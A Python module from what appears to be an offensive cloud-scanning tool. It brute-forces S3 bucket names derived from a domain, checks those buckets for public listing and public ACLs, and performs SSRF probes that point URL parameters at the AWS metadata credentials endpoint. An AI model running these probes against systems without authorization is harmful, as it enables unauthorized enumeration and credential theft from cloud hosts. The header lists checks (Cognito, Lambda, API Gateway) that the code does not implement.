"""
modules/aws_deep.py
-------------------
AWS-specific exploitation helpers.

Checks:
  - S3 bucket enumeration (multiple regions)
  - S3 bucket ACL misconfiguration
  - IMDSv1 metadata endpoint
  - Cognito Identity Pool misconfig
  - Lambda function URLs
  - API Gateway exposure
"""

import json
import re
from typing import List, Dict, Optional, Set
from urllib.parse import urlparse

from core.logger import get_logger, info, ok, warn
from core.utils import safe_request, write_lines
from core.rate_limiter import acquire
from modules._common import load_urls, module_dir, save_finding, cli_main

log = get_logger("aws_deep")


# ─────────────────────────────────────────
# AWS regions
# ─────────────────────────────────────────
AWS_REGIONS = [
    "us-east-1", "us-east-2", "us-west-1", "us-west-2",
    "eu-west-1", "eu-west-2", "eu-west-3", "eu-central-1",
    "ap-south-1", "ap-northeast-1", "ap-southeast-1", "ap-southeast-2",
]

# S3 URL patterns
def s3_urls(bucket: str) -> List[str]:
    urls = [f"https://{bucket}.s3.amazonaws.com"]
    for region in AWS_REGIONS[:4]:  # limit
        urls.append(f"https://{bucket}.s3.{region}.amazonaws.com")
    return urls


# ─────────────────────────────────────────
# Brand extraction for bucket guessing
# ─────────────────────────────────────────
def _brand_names(domain: str) -> Set[str]:
    base = domain.split(".")[0].lower()
    names = {base, base.replace("-", ""), base.replace("_", "")}
    # common prefixes/suffixes
    for pre in ["", "dev-", "staging-", "prod-", "test-", "backup-",
                "media-", "static-", "assets-", "cdn-"]:
        for suf in ["", "-dev", "-staging", "-prod", "-backup", "-media",
                    "-static", "-assets", "-cdn", "-files"]:
            names.add(f"{pre}{base}{suf}")
    return {n for n in names if n}


# ─────────────────────────────────────────
# Tests
# ─────────────────────────────────────────
def check_s3_bucket(bucket: str) -> List[Dict]:
    findings: List[Dict] = []
    for url in s3_urls(bucket):
        acquire(url)
        r = safe_request(url, timeout=8)
        if not r:
            continue
        if r.status_code == 200 and "ListBucketResult" in (r.text or ""):
            findings.append({
                "type": "s3_bucket_public_list",
                "url": url,
                "evidence": f"S3 bucket '{bucket}' publicly listable",
                "severity": "high",
                "confidence": 95,
            })
            break
        if r.status_code == 403 and "AccessDenied" in (r.text or ""):
            findings.append({
                "type": "s3_bucket_exists",
                "url": url,
                "evidence": f"S3 bucket '{bucket}' exists (403)",
                "severity": "info",
                "confidence": 80,
            })
            break
    return findings


def check_s3_website(bucket: str) -> Optional[Dict]:
    """Check S3 static website endpoint."""
    url = f"http://{bucket}.s3-website-us-east-1.amazonaws.com"
    acquire(url)
    r = safe_request(url, timeout=8, allow_redirects=False)
    if r and r.status_code in (200, 301, 302, 403):
        return {
            "type": "s3_website_hosting",
            "url": url,
            "evidence": f"S3 website endpoint responds: {r.status_code}",
            "severity": "low",
            "confidence": 60,
        }
    return None


def check_s3_acl(bucket: str) -> Optional[Dict]:
    """Check if bucket ACL is publicly readable."""
    url = f"https://{bucket}.s3.amazonaws.com/?acl"
    acquire(url)
    r = safe_request(url, timeout=8)
    if r and r.status_code == 200 and "AccessControlPolicy" in (r.text or ""):
        return {
            "type": "s3_acl_public",
            "url": url,
            "evidence": "S3 bucket ACL publicly readable",
            "severity": "high",
            "confidence": 90,
        }
    return None


def check_aws_metadata_via_ssrf(url: str) -> Optional[Dict]:
    """
    Test if a URL param can fetch AWS metadata.
    """
    if "=" not in url:
        return None
    metadata_endpoints = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    ]
    # Only test URLs with URL-like params
    parsed = urlparse(url)
    if not any(p in parsed.query.lower() for p in
               ["url=", "uri=", "target=", "dest=", "redirect="]):
        return None
    for meta in metadata_endpoints:
        test_url = re.sub(r"=(https?://[^&]+)", f"={meta}", url, count=1)
        acquire(test_url)
        r = safe_request(test_url, timeout=10)
        if r and ("ami-id" in (r.text or "") or "instance-id" in (r.text or "")
                  or "accessKeyId" in (r.text or "")):
            return {
                "type": "aws_metadata_ssrf_confirmed",
                "url": test_url,
                "evidence": f"AWS metadata leaked via {meta}",
                "severity": "critical",
                "confidence": 90,
            }
    return None


# ─────────────────────────────────────────
# Orchestrator
# ─────────────────────────────────────────
def run(domain: str, output_root: str = "results",
        scan_id: Optional[int] = None) -> Dict:
    mdir = module_dir(domain, "aws_deep", output_root)
    urls = load_urls(domain, output_root)

    findings: List[Dict] = []

    # S3 buckets from brand names
    brands = _brand_names(domain)
    info(f"Testing {len(brands)} S3 bucket candidates")
    for b in list(brands)[:40]:
        for f in check_s3_bucket(b):
            findings.append(f)
        web = check_s3_website(b)
        if web:
            findings.append(web)
        acl = check_s3_acl(b)
        if acl:
            findings.append(acl)

    # AWS metadata via SSRF candidates
    for url in urls[:20]:
        try:
            f = check_aws_metadata_via_ssrf(url)
            if f:
                findings.append(f)
        except Exception as e:
            log.debug(f"metadata ssrf test failed: {e}")

    # Save
    for f in findings:
        save_finding(domain, "aws_deep", f["type"], f["severity"],
                     f["url"], evidence=f.get("evidence", ""),
                     confidence=f.get("confidence", 0),
                     scan_id=scan_id, output_root=output_root)

    if findings:
        write_lines(mdir / "aws_findings.txt",
                    [f"[{f['severity']}] {f['type']} → {f['url']}"
                     for f in findings])

    return {"count": len(findings), "findings": findings}


if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser(description="AWS deep scanner")
    p.add_argument("-t", "--target", required=True)
    p.add_argument("-o", "--output", default="results")
    args = p.parse_args()
    cli_main(args.target, "aws_deep", run, args.output)